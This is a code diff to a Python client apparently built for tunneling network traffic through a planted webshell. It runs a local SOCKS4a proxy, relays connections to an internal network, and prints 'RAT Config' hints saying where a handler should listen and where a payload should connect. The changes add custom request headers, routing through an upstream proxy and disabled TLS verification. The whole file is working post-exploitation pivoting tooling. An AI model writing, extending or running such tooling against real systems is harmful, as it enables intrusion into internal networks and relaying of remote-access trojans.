@@ -37,6 +37,7 @@ class ClientCenter(threading.Thread):
             "Accept-Language": "zh-CN,zh;q=0.8",
             'Accept-Encoding': 'gzip',
         }
+        self.proxy = None
         self.CACHE_CONNS = {}
         self.MIRROR_CHCHE_CONNS = {}
         # {
@@ -65,7 +66,31 @@ class ClientCenter(threading.Thread):
         self.die_client_address = []
         self.mirror_die_client_address = []
         self.session = requests.session()
+        self.session.verify = False
         threading.Thread.__init__(self)
+
+    def custom_header(self, inputstr):
+        try:
+            str_headers = inputstr.split(",")
+            for str_header in str_headers:
+                header_type = str_header.split(":")[0].strip()
+                header_value = str_header.split(":")[1].strip()
+                self.headers[header_type] = header_value
+        except Exception as E:
+            self.logger.exception(E)
+            return False
+        self.logger.info("------------ Custom http request header ------------")
+        self.logger.info(self.headers)
+        self.logger.info("\n")
+        return True
+
+    def custom_proxy(self, proxy):
+        self.proxy = {'http': proxy, 'https': proxy}
+        self.session.proxies = self.proxy
+        self.logger.info("------------ Custom http request proxy ------------")
+        self.logger.info(self.proxy)
+        self.logger.info("\n")
+        return True
 
     def _post_data(self, url, data={}):
         payload = {
@@ -98,7 +123,6 @@ class ClientCenter(threading.Thread):
         self.logger.warning("LoopThread start")
         while True:
             self._sync_data()
-
 
     def _sync_data(self):
         has_data = False
@@ -286,13 +310,17 @@ class ClientCenter(threading.Thread):
 
     def setc_webshell(self, WEBSHELL):
         try:
-            r = requests.get(WEBSHELL, verify=False, timeout=3, headers=self.headers, )
+            r = requests.get(WEBSHELL, verify=False, timeout=3, headers=self.headers, proxies=self.proxy)
             if b"UTF-8" in r.content:
                 self.WEBSHELL = WEBSHELL
                 return True
             else:
                 return False
+        except requests.exceptions.ProxyError as proxyError:
+            self.logger.error("Connet to proxy failed : {}".format(self.proxy))
+            return False
         except Exception as E:
+            self.logger.exception(E)
             return False
 
     def setc_remoteserver(self, REMOTE_SERVER=None):
@@ -497,7 +525,7 @@ class Socks4aProxy(threading.Thread):
                                                                                                     self._port))
             return False
 
-        self.logger.info("Socks4a ready to accept")
+        self.logger.warning("Socks4a ready to accept")
         while True:
             try:
                 conn, addr = s.accept()
@@ -550,22 +578,36 @@ if __name__ == '__main__':
     parser.add_argument('-w', '--webshell', metavar='http://192.168.3.10:8080/proxy.jsp',
                         help="webshell url",
                         required=True)
+
+    parser.add_argument('--header', metavar='Authorization: XXX,Cookie: XXX',
+                        help="custom http request header",
+                        default=None)
+
+    parser.add_argument('--proxy', metavar='socks5://127.0.0.1:1080',
+                        help="Connect webshell through proxy",
+                        default=None)
+
     parser.add_argument('-l', '--locallistenaddress', metavar='127.0.0.1/0.0.0.0',
                         help="local listen address for socks4",
-                        default='127.0.0.1',
-                        required=True)
-    parser.add_argument('-p', '--port',
-                        default=60000,
+                        default='127.0.0.1')
+    parser.add_argument('-p', '--locallistenport',
+                        default=10800,
                         metavar='N',
                         type=int,
                         help="local listen port for socks4",
                         )
 
-    parser.add_argument('-st', '--sockettimeout', default=0.05,
+    parser.add_argument('-st', '--sockettimeout', default=0.2,
                         metavar="N",
                         type=float,
                         help="socket timeout value",
                         )
+    parser.add_argument('-ti', '--targetipaddress', metavar='127.0.0.1',
+                        help="reverse proxy target ipaddress",
+                        required=False)
+    parser.add_argument('-tp', '--targetport', metavar='60020',
+                        help="reverse proxy target port",
+                        required=False)
     parser.add_argument('-c', '--cleansockst', default=False,
                         nargs='?',
                         metavar="true",
@@ -578,16 +620,10 @@ if __name__ == '__main__':
                         type=bool,
                         help="clean server exist socket(this will kill other client connect)",
                         )
-    parser.add_argument('-ti', '--targetipaddress', metavar='127.0.0.1',
-                        help="reverse proxy target ipaddress",
-                        required=False)
-    parser.add_argument('-tp', '--targetport', metavar='60020',
-                        help="reverse proxy target port",
-                        required=False)
     args = parser.parse_args()
     WEBSHELL = args.webshell
     LISTEN_ADDR = args.locallistenaddress
-    LISTEN_PORT = args.port
+    LISTEN_PORT = args.locallistenport
 
     CLEAN_SOCKET = args.cleansockst
     if CLEAN_SOCKET is not False:
@@ -596,6 +632,18 @@ if __name__ == '__main__':
         CLEAN_SOCKET = False
 
     globalClientCenter = ClientCenter()
+    header = args.header
+    if header is not None:
+        flag = globalClientCenter.custom_header(header)
+        if flag is not True:
+            sys.exit(1)
+
+
+    proxy = args.proxy
+    if proxy is not None:
+        flag = globalClientCenter.custom_proxy(proxy)
+        if flag is not True:
+            sys.exit(1)
 
     SINGLE_MODE = args.singlemode
     if SINGLE_MODE is not False:
@@ -605,73 +653,80 @@ if __name__ == '__main__':
     else:
         SINGLE_MODE = False
 
-    globalClientCenter.logger.info("Local listen checking ...")
+    globalClientCenter.logger.info("------------------- Local check -------------------")
     flag = globalClientCenter.setc_localaddr(LISTEN_ADDR, LISTEN_PORT)
     if flag:
-        globalClientCenter.logger.info("Local listen check pass")
-        globalClientCenter.logger.info("Socks4a on {}:{}".format(LISTEN_ADDR, LISTEN_PORT))
+        globalClientCenter.logger.info("Local listen check : pass")
     else:
         globalClientCenter.logger.error(
             "Local listen check failed, please check if {}:{} is available".format(LISTEN_ADDR, LISTEN_PORT))
         globalClientCenter.logger.error(WEBSHELL)
-    globalClientCenter.logger.info("WEBSHELL checking ...")
+        sys.exit(1)
+
     webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
     if webshell_alive:
-        globalClientCenter.logger.info("WEBSHELL check pass")
+        globalClientCenter.logger.info("WEBSHELL check : pass")
         globalClientCenter.logger.info("WEBSHELL: {}".format(WEBSHELL))
     else:
         globalClientCenter.logger.error("WEBSHELL check failed!")
         globalClientCenter.logger.error(WEBSHELL)
         sys.exit(1)
-    globalClientCenter.logger.info("REMOTE_SERVER checking ...")
+
     result = globalClientCenter.setc_remoteserver()
     if result is None:
         globalClientCenter.logger.error("Read REMOTE_SERVER failed,please check whether server is running")
         sys.exit(1)
     else:
         MIRROR_LISTEN = "127.0.0.1:60020"
-        globalClientCenter.logger.info("REMOTE_SERVER check pass")
-        globalClientCenter.logger.info("------------------- Sever Config -------------------")
+        globalClientCenter.logger.info("REMOTE_SERVER check : pass")
+        globalClientCenter.logger.info("\n")
+        globalClientCenter.logger.info("------------------- Get Sever Config -------------------")
         for key in result:
             globalClientCenter.logger.info("{} : {}".format(key, result.get(key)))
             if key == "MIRROR_LISTEN":
                 MIRROR_LISTEN = result.get(key)
+        globalClientCenter.logger.info("\n")
+
+    globalClientCenter.logger.info("------------------- Set Sever Config -------------------")
+    # 是否清理已有连接
     if CLEAN_SOCKET:
         flag = globalClientCenter.send_cmd("CLEAN_SOCKET")
         globalClientCenter.logger.info("CLEAN_SOCKET cmd : {}".format(flag))
 
+    # server建立内网tcp连接的超时时间,超时时间越长速度越慢
     sockettimeout = args.sockettimeout
     if sockettimeout != DEFAULT_SOCKET_TIMEOUT:
         flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", sockettimeout)
         globalClientCenter.logger.info("Set server SOCKET_TIMEOUT => {}".format(flag))
-
         globalClientCenter.SOCKET_TIMEOUT = sockettimeout
+    globalClientCenter.logger.info("\n")
 
+    # 映射到本地的地址
     TARGET_IP = args.targetipaddress
     if TARGET_IP is None:
         globalClientCenter.TARGET_IP = MIRROR_LISTEN.split(":")[0]
     else:
         globalClientCenter.TARGET_IP = TARGET_IP
 
+    # 映射到本地的端口
     TARGET_PORT = args.targetport
     if TARGET_PORT is None:
         globalClientCenter.TARGET_PORT = int(MIRROR_LISTEN.split(":")[1])
     else:
         globalClientCenter.TARGET_PORT = int(TARGET_PORT)
+
+    globalClientCenter.logger.info("------------------! RAT Config !------------------")
+    globalClientCenter.logger.info("Socks4a on {}:{}".format(LISTEN_ADDR, LISTEN_PORT))
     globalClientCenter.logger.info(
-        "TARGET_ADDRESS : {}:{}".format(globalClientCenter.TARGET_IP, globalClientCenter.TARGET_PORT))
-
-
-
-    globalClientCenter.logger.info("------------------- RAT Config -------------------")
-    globalClientCenter.logger.info(
-        "Handler/LISTEN should listen on {}:{}".format(globalClientCenter.TARGET_IP, globalClientCenter.TARGET_PORT))
+        "Handler/LISTENER should listen on {}:{}".format(globalClientCenter.TARGET_IP, globalClientCenter.TARGET_PORT))
     globalClientCenter.logger.info(
         "Payload should connect to {}".format(MIRROR_LISTEN))
+    globalClientCenter.logger.info("------------------! RAT Config !------------------\n")
+
     # 启动服务
     globalClientCenter.setDaemon(True)
 
-    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.port, timeout=sockettimeout, bufsize=BUFSIZE)
+    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.locallistenport, timeout=sockettimeout, bufsize=BUFSIZE)
     t2.setDaemon(True)
 
     globalClientCenter.start()
